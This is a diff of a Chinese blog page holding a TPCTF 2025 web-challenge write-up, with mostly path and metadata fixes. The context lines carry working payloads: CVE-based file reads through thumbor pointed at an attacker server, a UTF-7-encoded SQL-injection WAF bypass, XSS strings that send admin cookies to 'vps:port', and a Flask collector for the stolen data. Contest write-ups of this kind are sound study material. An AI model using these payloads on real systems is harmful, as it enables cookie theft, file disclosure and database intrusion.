@@ -26,27 +26,26 @@
 <meta property="og:site_name" content="EddieMurphy&#39;s blog">
 <meta property="og:description" content="前言我勒个XSS大赛。。 最喜欢的java没有出现在web中，反而在misc中吗，哈吉tpctf你这家伙。 thumbor 1附件给的是thumbor的插件环境，hint说没有0day。 那应该就不是thumbor本身的问题，其实也有点关系，就是可以url访问图片，这个在官方security文档就能看到：Security — Thumbor 7.7.4 documentation 但这个题其实是依">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171249419.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171325491.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171335377.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/761c7091405f5f466125cac7e6605f27.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171818815.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171851877.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312173728078.png">
-<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/to1qD1Twc5yLJSAibB5Vqmx9ZueJlF1ibH7S30yjzQzgYgiawEBic88HnVqVJtsdKghiaRKVib6pGRZrQwzrIZhhZNnA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312175306344.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312175631770.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312175818038.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250313004157671.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250313004231645.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312182551861.png">
-<meta property="og:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312184013283.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171249419.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171325491.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171335377.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/761c7091405f5f466125cac7e6605f27.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171818815.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171851877.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/image-20250312173728078.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/image-20250312175306344.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/image-20250312175631770.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/image-20250312175818038.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/image-20250313004157671.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/image-20250313004231645.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/image-20250312182551861.png">
+<meta property="og:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/image-20250312184013283.png">
 <meta property="article:published_time" content="2025-03-12T09:03:45.000Z">
-<meta property="article:modified_time" content="2025-03-12T16:42:40.113Z">
+<meta property="article:modified_time" content="2025-03-12T16:44:10.421Z">
 <meta property="article:author" content="EddieMurphy">
 <meta property="article:tag" content="比赛">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://eddiemurphy89.github.io/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171249419.png">
+<meta name="twitter:image" content="https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171249419.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -313,21 +312,21 @@
 <p>这里的漏洞即为<code>CVE-2022-44268</code>，ImageMagick的任意文件读取漏洞。</p>
 <p><a target="_blank" rel="noopener" href="https://www.metabaseq.com/threat/imagemagick-zero-days/">https://www.metabaseq.com/threat/imagemagick-zero-days/</a><br><a target="_blank" rel="noopener" href="https://github.com/voidz0r/CVE-2022-44268?tab=readme-ov-file">https://github.com/voidz0r/CVE-2022-44268?tab=readme-ov-file</a></p>
 <p>我们可以让靶机访问挂在自己vps上精心构造好的png，远程解析就会把对应的文件附加在图片里，复现CVE就完了：</p>
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171249419.png" srcset="/img/loading.gif" lazyload alt="image-20250312171249419"></p>
+<p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171249419.png" srcset="/img/loading.gif" lazyload alt="image-20250312171249419"></p>
 <p>flag也一样的，低权限可读：</p>
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171325491.png" srcset="/img/loading.gif" lazyload alt="image-20250312171325491"></p>
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171335377.png" srcset="/img/loading.gif" lazyload alt="image-20250312171335377"></p>
+<p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171325491.png" srcset="/img/loading.gif" lazyload alt="image-20250312171325491"></p>
+<p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171335377.png" srcset="/img/loading.gif" lazyload alt="image-20250312171335377"></p>
 <h2 id="thumbor-2"><a href="#thumbor-2" class="headerlink" title="thumbor 2"></a>thumbor 2</h2><p>还是一样的组件漏洞，但是可以发现dockerfile里重装了最新的ImageMagick，所以需要找新的组件。</p>
 <p>这里队里nama和赵哥找了很多，试了XXE等等，以及ghostscript 9.5的RCE，均失败。但是很奇怪的是版本用的gs确实是9.5，为什么打不通呢。。。</p>
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/761c7091405f5f466125cac7e6605f27.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/2025/03/12/TPCTF2025-WEB-Learning/761c7091405f5f466125cac7e6605f27.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>最终锁定漏洞组件librsvg，<code>CVE-2023-38633</code>：librsvg 2.56.3 之前版本中 URL 解码器的目录遍历问题，可以被本地或远程攻击者用来泄露文件：</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/HMX404/article/details/137231580">https://blog.csdn.net/HMX404/article/details/137231580</a></p>
 <p>同样的打法，可以获得漏洞解析后的包含flag的图片，直接访问就能看到了：</p>
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171818815.png" srcset="/img/loading.gif" lazyload alt="image-20250312171818815"></p>
+<p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171818815.png" srcset="/img/loading.gif" lazyload alt="image-20250312171818815"></p>
 <p>这里看不到完整的直接调宽高就行了。flag也是低权限可读：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -o output.jpg -H <span class="hljs-string">&quot;Host: 1.95.57.127:3602&quot;</span> -H <span class="hljs-string">&quot;Accept-Encoding: gzip, deflate&quot;</span> -H <span class="hljs-string">&quot;Upgrade-Insecure-Requests: 1&quot;</span> -H <span class="hljs-string">&quot;Priority: u=0, i&quot;</span> -H <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0&quot;</span> -H <span class="hljs-string">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span> -H <span class="hljs-string">&quot;Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span> <span class="hljs-string">&quot;http://1.95.57.127:3602/thumbor/unsafe/smart/http%3A%2F%2Fvps%3A1234%2F1.svg&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312171851877.png" srcset="/img/loading.gif" lazyload alt="image-20250312171851877"></p>
+<p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312171851877.png" srcset="/img/loading.gif" lazyload alt="image-20250312171851877"></p>
 <h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>赵哥太狠了，直接拿下一血。</p>
 <p>论文题，按照它的方法打复现就行了：</p>
 <p><a target="_blank" rel="noopener" href="https://www.jianjunchen.com/p/wafmanis.sq24.pdf">Jianjun Chen | Associate Professor | Tsinghua University</a></p>
@@ -338,10 +337,9 @@
 <p>直接往&#x2F;flag发POST：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">+AHUAcwBlAHIAbgBhAG0AZQ-=+AGEAZABtAGkAbg-&amp;+AHAAYQBzAHMAdwBvAHIAZA-=+ACcALwAqACoALwB1AG4AaQBvAG4ALwAqACoALwBTAEUATABFAEMAVAAvACoAKgAvADEALAAyACwAUgBFAFAATABBAEMARQAoAFIARQBQAEwAQQBDAEUAKAAnACIALwAqACoALwB1AG4AaQBvAG4ALwAqACoALwBTAEUATABFAEMAVAAvACoAKgAvADEALAAyACwAUgBFAFAATABBAEMARQAoAFIARQBQAEwAQQBDAEUAKAAiAC4AIgAsAEMASABBAFIAKAAzADQAKQAsAEMASABBAFIAKAAzADkAKQApACwAQwBIAEEAUgAoADQANgApACwAIgAuACIAKQAvACoAKgAvAEEAUwAvACoAKgAvAGMAaAAzAG4AcwAxAHIALQAtACcALABDAEgAQQBSACgAMwA0ACkALABDAEgAQQBSACgAMwA5ACkAKQAsAEMASABBAFIAKAA0ADYAKQAsACcAIgAvACoAKgAvAHUAbgBpAG8AbgAvACoAKgAvAFMARQBMAEUAQwBUAC8AKgAqAC8AMQAsADIALABSAEUAUABMAEEAQwBFACgAUgBFAFAATABBAEMARQAoACIALgAiACwAQwBIAEEAUgAoADMANAApACwAQwBIAEEAUgAoADMAOQApACkALABDAEgAQQBSACgANAA2ACkALAAiAC4AIgApAC8AKgAqAC8AQQBTAC8AKgAqAC8AYwBoADMAbgBzADEAcgAtAC0AJwApAC8AKgAqAC8AQQBTAC8AKgAqAC8AYwBoADMAbgBzADEAcgAtAC0-<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312173728078.png" srcset="/img/loading.gif" lazyload alt="image-20250312173728078"></p>
+<p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312173728078.png" srcset="/img/loading.gif" lazyload alt="image-20250312173728078"></p>
 <p>当然也有真去注的，用quine注入，其他队的wp可以康：</p>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkzMzYxNjI5Mw==&mid=2247484898&idx=1&sn=dc43b70afd69797c9e38064cf885aca8&chksm=c38c579bc6a06095bcf013f14ab0283825e8697521db2ccb994146d2c8734fc8b42a70fafc73&mpshare=1&scene=23&srcid=0311SjwfgvA26hSXXa38Dg7s&sharer_shareinfo=39bc415b40460825aa4be31f9fa60d83&sharer_shareinfo_first=39bc415b40460825aa4be31f9fa60d83#rd">TPCTF 2025 Writeup by 0xFFF</a></p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/to1qD1Twc5yLJSAibB5Vqmx9ZueJlF1ibH7S30yjzQzgYgiawEBic88HnVqVJtsdKghiaRKVib6pGRZrQwzrIZhhZNnA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h2 id="layout三件套"><a href="#layout三件套" class="headerlink" title="layout三件套"></a>layout三件套</h2><p>原题打法。</p>
 <p>请看VCR：</p>
 <p><a target="_blank" rel="noopener" href="https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations">Exploring the DOMPurify library: Hunting for Misconfigurations (2&#x2F;2) | mizu.re</a></p>
@@ -349,27 +347,27 @@
 <h3 id="baby-layout"><a href="#baby-layout" class="headerlink" title="baby layout"></a>baby layout</h3><p>源码很简单，XSS读到admin的cookie就是flag。</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">layout</span>:   <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span>  <br><span class="hljs-attr">content</span>:  test<span class="hljs-string">&quot; onload=location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//vps:port?flag=&quot;+document.cookie src=&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312175306344.png" srcset="/img/loading.gif" lazyload alt="image-20250312175306344"></p>
+<p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312175306344.png" srcset="/img/loading.gif" lazyload alt="image-20250312175306344"></p>
 <h3 id="safe-layout"><a href="#safe-layout" class="headerlink" title="safe layout"></a>safe layout</h3><p>在原来的基础上过滤了所有html属性。加了个</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">ALLOWED_ATTR</span>: []<br></code></pre></td></tr></table></figure>
 
 <p>data-* 和 aria-* 类的属性不会被过滤，按照文章改改就行：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">layout</span>:   <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">data-type</span>=<span class="hljs-string">&quot;&#123;&#123;content&#125;&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span><br><span class="hljs-attr">content</span>:  test<span class="hljs-string">&quot; onload=location.href=&quot;</span><span class="hljs-attr">http</span>:<span class="hljs-comment">//vps:port?flag=&quot;+document.cookie src=&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312175631770.png" srcset="/img/loading.gif" lazyload alt="image-20250312175631770"></p>
+<p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312175631770.png" srcset="/img/loading.gif" lazyload alt="image-20250312175631770"></p>
 <h3 id="safe-layout-revenge"><a href="#safe-layout-revenge" class="headerlink" title="safe layout revenge"></a>safe layout revenge</h3><p>除了对attr进行过滤，aria和data一并被过滤：</p>
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312175818038.png" srcset="/img/loading.gif" lazyload alt="image-20250312175818038"></p>
+<p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312175818038.png" srcset="/img/loading.gif" lazyload alt="image-20250312175818038"></p>
 <p>可以采用style绕过，把xss的payload构造好后把script标签插入content：</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">layout</span>: x&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;img src=x onerror=<span class="hljs-title function_">alert</span>()&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure>
 
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">x&lt;style&gt;&lt;&#123;&#123;content&#125;&#125;/style&gt;&lt;&#123;&#123;content&#125;&#125;img src=x onerror=<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://vps:port?flag=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)&gt;&lt;/style&gt;<br></code></pre></td></tr></table></figure>
 
 <p>提交内容为空即可：</p>
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250313004157671.png" srcset="/img/loading.gif" lazyload alt="image-20250313004157671"></p>
+<p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250313004157671.png" srcset="/img/loading.gif" lazyload alt="image-20250313004157671"></p>
 <p>官方：</p>
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250313004231645.png" srcset="/img/loading.gif" lazyload alt="image-20250313004231645"></p>
+<p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250313004231645.png" srcset="/img/loading.gif" lazyload alt="image-20250313004231645"></p>
 <h2 id="Are-you-incognito"><a href="#Are-you-incognito" class="headerlink" title="Are you incognito?"></a>Are you incognito?</h2><p>好像是ustc发现的0day？</p>
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312182551861.png" srcset="/img/loading.gif" lazyload alt="image-20250312182551861"></p>
+<p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312182551861.png" srcset="/img/loading.gif" lazyload alt="image-20250312182551861"></p>
 <p>做法来自<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3N_0_rL38i5bg7iRjSd9qA">TPCTF2025 writeup by Mini-Venom</a>：</p>
 <p>如果不存在<code>broswer.runtime.id</code>，则<code>module.exports</code>导出<code>window</code>的<code>browser</code>。</p>
 <p>注意到<code>globalThis</code>是<code>window</code>，因此可以使用<code>dom clobberate</code>污染<code>browser.runtime.id</code>：</p>
@@ -380,7 +378,7 @@
 
 <h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">try</span>:<br>        file_path = os.path.join(os.path.dirname(__file__), <span class="hljs-string">&#x27;index.html&#x27;</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            data = f.read()<br>        <span class="hljs-keyword">return</span> data, <span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span>&#125;<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Internal Server Error&#x27;</span>, <span class="hljs-number">500</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-comment"># 处 理  POST 请 求</span><br>    body = request.data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    response = &#123;<br>        <span class="hljs-string">&#x27;status&#x27;</span>: <span class="hljs-string">&#x27;flag&#x27;</span>,<br>        <span class="hljs-string">&#x27;data&#x27;</span>: body<br>    &#125;<br>    <span class="hljs-built_in">print</span>(response)<br>    <span class="hljs-keyword">return</span> jsonify(response), <span class="hljs-number">200</span><br><br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page_not_found</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Not Found&#x27;</span>, <span class="hljs-number">404</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">21000</span>)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312184013283.png" srcset="/img/loading.gif" lazyload alt="image-20250312184013283"></p>
+<p><img src="/2025/03/12/TPCTF2025-WEB-Learning/image-20250312184013283.png" srcset="/img/loading.gif" lazyload alt="image-20250312184013283"></p>
 
                 
               </div>
